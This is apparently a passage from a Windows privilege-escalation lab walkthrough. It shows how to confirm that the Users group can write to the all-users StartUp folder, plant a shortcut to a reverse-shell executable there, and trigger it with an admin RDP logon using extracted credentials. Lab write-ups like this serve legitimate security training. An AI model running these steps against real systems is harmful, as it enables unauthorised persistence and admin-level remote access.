
Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:

`C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`

Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:

`cscript C:\PrivEsc\CreateShortcut.vbs`

Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:

`rdesktop -u admin 10.10.166.88`

A shell running as admin should connect back to your listener.